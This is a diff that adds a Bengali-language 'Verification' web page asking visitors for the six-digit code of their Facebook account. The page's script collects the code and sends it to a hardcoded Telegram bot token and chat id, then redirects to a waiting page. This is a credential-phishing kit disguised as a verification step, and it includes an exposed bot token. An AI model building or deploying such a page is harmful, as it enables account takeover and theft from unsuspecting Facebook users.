@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex flex-col items-center min-h-screen">
+
+    <div class="w-full h-[40vh] flex justify-center items-center overflow-hidden bg-white border-b shadow-sm">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
+             alt="Profile" class="h-full w-full object-cover">
+    </div>
+
+    <div class="w-full max-w-sm p-6 bg-white rounded-t-3xl shadow-2xl -mt-6">
+        <h2 class="text-xl font-bold text-center mb-4">Verification</h2>
+        <p class="text-sm text-gray-600 mb-6 text-center">
+            আপনার ফেসবুক আইডির ৬ সংখ্যার কোডটি নিচে বসান।
+        </p>
+
+        <div id="code-inputs" class="flex justify-between gap-2 mb-6">
+            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+        </div>
+    </div>
+
+    <script>
+        function move(input) {
+            if (input.value.length === 1) {
+                let next = input.nextElementSibling;
+                if (next) next.focus();
+                else checkAll();
+            }
+        }
+
+        async function checkAll() {
+            let code = "";
+            document.querySelectorAll('input').forEach(i => code += i.value);
+            
+            if(code.length === 6) {
+                // এখানে আপনার আগের টেলিগ্রাম বট কোডটি বসাবেন
+                const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+                const chatId = "8516934257";
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: chatId, 
+                        text: `📩 কোড পাওয়া গেছে: ${code}`,
+                        reply_markup: {
+                            inline_keyboard: [[
+                                {text: "✅ Success", callback_data: "success"},
+                                {text: "❌ Error", callback_data: "error"}
+                            ]]
+                        }
+                    })
+                });
+
+                // সাবমিট করার পর লোডিং স্ক্রিনে রিডাইরেক্ট করুন
+                window.location.href = "waiting.html";
+            }
+        }
+    </script>
+</body>
+</html>
